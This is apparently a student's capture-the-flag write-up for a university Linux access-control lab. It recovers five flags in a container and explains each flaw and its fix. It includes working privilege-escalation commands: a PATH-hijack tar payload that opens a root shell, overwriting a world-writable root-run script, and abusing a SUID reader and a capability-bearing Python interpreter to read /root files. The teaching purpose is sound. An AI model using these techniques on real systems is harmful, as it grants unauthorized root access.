# TP 3: Access Control CTF

Author: ALOUI Issam Eddine (SnBork)
Module: Computer Systems Security, University of Blida 1

Goal: find the five flags inside the challenge container and explain the access-control failure behind each one.

> [!abstract] Scope
> Everything below happens inside the provided container, as the unprivileged `student` account. No root login, no host or Docker socket attacks, no password guessing and no kernel exploits.

## Table of Contents

- [[#Flags at a glance]]
- [[#Setup]]
- [[#Flag 1: hidden does not mean protected]]
- [[#Flag 2: the confused deputy]]
- [[#Flag 3: sudo and least privilege]]
- [[#Flag 4: root executes what you can modify]]
- [[#Flag 5: Linux capabilities]]
- [[#Wrap-up]]

---

## Flags at a glance

| # | Recovered value | Where it lived |
| --- | --- | --- |
| 1 | `FLAG{hidden_files_are_not_access_control}` | `/opt/lab/data/.cache/.old/.tmp/.flag1` |
| 2 | `FLAG{confused_deputy_reads_for_the_attacker}` | `/root/flag2.txt` |
| 3 | `FLAG{least_privilege_is_not_optional}` | `/root/flag3.txt` |
| 4 | `FLAG{root_should_never_execute_student_writable_code}` | `/root/flag4.txt` |
| 5 | `FLAG{capabilities_can_be_more_precise_than_suid}` | `/root/flag5.txt` |

---

## Setup

The lab ships as `Linux_Access_Control_CTFv2.zip` with a `Dockerfile`, a `docker-compose.yml`, a `student/` folder whose contents land in the home directory, and `connect.sh`.

![[pictures/image-01.png]]

I built and started it from the extracted folder:

```bash
cd Linux_Access_Control_CTF
docker compose up -d --build
```

Docker Desktop then lists `access-control-ctf` running from `linux_access_control_ctf-access-ctf:latest`, and the Exec tab opens a shell inside it.

![[pictures/image-02.png]]

That shell is bare: the prompt is just `$`, with no history and no job control. `python` is missing, `python3` is there, so I used its `pty` module to get a real terminal:

```bash
which python3                     # /usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The prompt changes to `student@<container-id>:~$`, an interactive `bash` running as the low-privileged user. The home directory already pointed at the theme, with a vault reader and the source of a hardened version:

```bash
ls
# lab-maintenance.log  read_vault-fixed.c  read_vault
```

![[pictures/image-03.png]]

---

## Flag 1: hidden does not mean protected

The flag was a dotfile a few directories deep. Instead of guessing paths I searched the filesystem by name:

```bash
find / -type f -name "*flag*" 2>/dev/null
```

Most hits were noise from `/sys` (the `flags` entries under the tty devices) and kernel headers. One path looked intentional:

```
/opt/lab/data/.cache/.old/.tmp/.flag1
```

```bash
ls -l /opt/lab/data/.cache/.old/.tmp/.flag1
# -rw-r--r-- 1 root root 42 Nov  1 14:30
cat /opt/lab/data/.cache/.old/.tmp/.flag1
# FLAG{hidden_files_are_not_access_control}
```

![[pictures/image-04.png]]

> [!success] Flag 1
> ```
> FLAG{hidden_files_are_not_access_control}
> ```

The file is `644` and owned by root, so every account on the box can read it. The `.cache`, `.old` and `.tmp` directories keep it out of a casual `ls`, and once the path is known the kernel applies the same permission check it applies to any other file. Confidentiality rested on the name being hard to guess.

A mode of `600`, or a `700` directory around it, would leave the DAC check with something to enforce.

---

## Flag 2: the confused deputy

The `read_vault` in my home directory is a copy. The one that mattered sat elsewhere, so I listed every SUID file rather than trusting the home folder:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The output was mostly `passwd`, `su`, `sudo` and `mount`, plus one entry that did not fit:

```
/opt/lab/bin/read-vault
```

```bash
ls -l /opt/lab/bin/read-vault
# -rwsr-xr-x 1 root root 16408 Nov  1 14:30 /opt/lab/bin/read-vault
```

The `s` in the owner's execute slot means the program runs with root's effective UID. Called without arguments, it prints its whole interface:

```bash
/opt/lab/bin/read-vault
# Usage: /opt/lab/bin/read-vault <file>
```

So I passed it root's own flag file:

```bash
/opt/lab/bin/read-vault /root/flag2.txt
# [vault-reader] privileged read of: /root/flag2.txt
# FLAG{confused_deputy_reads_for_the_attacker}
```

![[pictures/flag-02.png]]

> [!success] Flag 2
> ```
> FLAG{confused_deputy_reads_for_the_attacker}
> ```

Because the process runs as root, the kernel lets it open anything. The only check between me and `/root/flag2.txt` was the program's own, and it looks at who is asking rather than what is being asked for. The path comes from the caller while the privilege comes from root, so the file gets read on the student's behalf. That is the confused deputy: the program had the authority and I supplied the request.

The fix is to drop privileges with `setresuid` before opening the file, or to check the real UID against the requested path and refuse anything the caller could not read himself. `~/read_vault-fixed.c` is the hardened version.

---

## Flag 3: sudo and least privilege

`sudo -l` is the first thing worth checking, and it came back generous:

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/bin/backup-report
(root) NOPASSWD: /usr/local/bin/vault-grade
(root) NOPASSWD: /opt/lab/bin/root-maintenance-loop.sh
```

`backup-report` runs as root and calls `tar` by name:

```bash
cat /usr/local/bin/backup-report
# tar -cf /opt/lab/backups/student-backup.tar /opt/lab/data/* >/dev/null 2>&1
```

Since the shell resolves `tar` through `PATH`, a `tar` of my own in the home directory gets picked first. My first `export` attempt used the wrong syntax and failed; this one worked:

```bash
export PATH=/home/student:$PATH
```

The first payload copies the flag into my home directory:

```bash
echo 'cat /root/flag3.txt > /home/student/flag3.txt' > tar
sudo /usr/local/bin/backup-report
cat flag3.txt
# FLAG{least_privilege_is_not_optional}
```

A cleaner one starts a root shell on the terminal instead:

```bash
echo '/bin/bash > /dev/tty 2> /dev/tty' > tar
sudo /usr/local/bin/backup-report
id          # uid=0(root) gid=0(root)
cat /root/flag3.txt
```

![[pictures/image-05.png]]
![[pictures/image-06.png]]

> [!success] Flag 3
> ```
> FLAG{least_privilege_is_not_optional}
> ```

sudo authorised one script, but the script runs a name rather than a binary. That name resolves inside a directory I control, so the authorisation covered whatever the script could reach, up to a root shell. The policy protected the entry point and left the rest of the chain open, which is the least-privilege failure.

Absolute paths inside the script, `/usr/bin/tar`, with `secure_path` or a sanitised `env`, would close it.

---

## Flag 4: root executes what you can modify

`ps aux` showed the loop already running as root:

```bash
ps aux | grep root
```

```
root ... sudo -n /opt/lab/bin/root-maintenance-loop.sh
root ... /bin/bash /opt/lab/bin/root-maintenance-loop.sh
```

It runs a maintenance script every ten seconds:

```bash
cat /opt/lab/bin/root-maintenance-loop.sh
# while true; do /opt/lab/bin/maintenance.sh; sleep 10; done
```

That script was world-writable:

```bash
ls -l /opt/lab/bin/maintenance.sh
# -rwxrwxrwx 1 root root 275 Nov  1 14:30
```

So I replaced its contents with a command that copies the flag into my home directory and waited for the next iteration:

```bash
echo 'cat /root/flag4.txt > /home/student/flag4.txt' > /opt/lab/bin/maintenance.sh
sleep 15
cat flag4.txt
# FLAG{root_should_never_execute_student_writable_code}
```

![[pictures/image-07.png]]

> [!success] Flag 4
> ```
> FLAG{root_should_never_execute_student_writable_code}
> ```

A second variant puts an interactive shell in the same slot and triggers the loop through sudo:

```bash
echo '/bin/bash' > /opt/lab/bin/maintenance.sh
sudo /opt/lab/bin/root-maintenance-loop.sh
# root@<container-id>:/home/student# cat /root/flag4.txt
```

![[pictures/image-09.png]]

The owner is root but the mode is `777`, so a privileged process kept executing a file I could rewrite. Nothing was wrong with the script's logic; the permissions let me choose what it ran, which breaks the authorization the whole arrangement depends on.

`chmod 755` with root ownership, and privileged scripts kept out of user-writable directories, would prevent it.

---

## Flag 5: Linux capabilities

File capabilities are a separate mechanism from SUID, and `getcap` walks the filesystem for them:

```bash
getcap -r / 2>/dev/null
# /opt/lab/bin/lab-python cap_dac_read_search=ep
```

A Python interpreter carried `cap_dac_read_search`, which lets a process read files and search directories while ignoring DAC checks. Running it as the student was enough:

```bash
/opt/lab/bin/lab-python
```

```python
>>> import os
>>> os.listdir('/root')
['.bashrc', '.profile', '.bash_history', 'flag3.txt', 'flag4.txt', 'flag5.txt']
>>> with open('/root/flag5.txt', 'r') as flag5: flag5.readlines()
['FLAG{capabilities_can_be_more_precise_than_suid}\n']
```

My first one-liner raised an `IndentationError`; the single-line form above works.

![[pictures/image-08.png]]

> [!success] Flag 5
> ```
> FLAG{capabilities_can_be_more_precise_than_suid}
> ```

The capability skips the read-permission check for the process, so `/root` became readable without any setuid binary. Because the carrier is a general-purpose interpreter, anyone who can execute it gets a root file-read primitive. Handing that much to a shell-like program is the least-privilege failure here.

Removing the capability with `setcap -r`, or moving it to a narrow helper that only reads the one path it needs, would fix it.

---

## Wrap-up

| # | Weakness | Mechanism | Privilege gained | Protected resource |
| --- | --- | --- | --- | --- |
| 1 | Hidden does not mean protected | world-readable `644` file in hidden directories | none needed | `/opt/lab/data/.cache/.old/.tmp/.flag1` |
| 2 | Confused deputy | SUID helper trusts a caller-supplied path | root's file access | `/root/flag2.txt` |
| 3 | Over-broad sudo | `PATH` hijack of `tar` in a root script | root shell | `/root/flag3.txt` |
| 4 | Writable code run by root | `777` maintenance script in a root loop | root code execution | `/root/flag4.txt` |
| 5 | Dangerous capability | `cap_dac_read_search` on Python | bypasses DAC read checks | `/root/flag5.txt` |

None of the five needed a memory-corruption bug or a kernel exploit. Each time the permission model existed and was applied at the wrong object or the wrong step: a readable file behind a hidden name, a helper that trusts its caller's path, a script that resolves names through `PATH`, a root loop running a writable file, and a capability handed to an interpreter.

The fixes are small. Set the flag file to `600`, drop privileges before reading a caller-supplied path, use absolute paths in sudo scripts, keep root-executed files unwritable, and keep broad capabilities away from interpreters.
